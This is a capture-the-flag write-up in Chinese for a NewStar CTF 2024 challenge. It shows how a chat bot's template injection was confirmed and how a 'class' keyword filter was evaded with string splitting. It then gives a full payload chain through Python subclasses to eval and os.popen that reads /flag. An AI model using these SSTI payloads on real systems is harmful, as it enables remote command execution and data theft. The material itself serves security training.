---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# 复读机

可以看到，输入什么就输出什么

输入 `{{ '{'+'{ 7*7 }'+'}' }}` 的时候，输出的结果是 49，说明存在 SSTI 注入

当输入 `{{ '{'+'{ [].__class__} '+'}' }}`

发现 bot 显示不喜欢上课,说明 `class` 被过滤了，可以使用简单的拼接绕过

```python
{{'{'+`{[]['__cl'+'ass__']}`+'}'}}
```

得到 `list` 类

![简单的 SSTI](/assets/images/wp/2024/week2/fuduji_1.png)

后面就是基本的注入方法了

获取 `object` 类

```python
{{()['__cl'+'ass__']['__base__']}}
{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__']}}
```

![获取 object 类](/assets/images/wp/2024/week2/fuduji_2.png)

找一个可以利用的类，这里选用 `os._wrap_close`

```python
{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__'][132]}}
```

![获取 os._wrap_close](/assets/images/wp/2024/week2/fuduji_3.png)

然后就是拿到 `eval` 方法，命令执行就行

```python
{{()['__cl'+'ass__']['__base__']['__subcl'+'asses__']()[132]['__init__']['__globals__']['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

![命令执行](/assets/images/wp/2024/week2/fuduji_4.png)

方法很多，大家可以自己试试
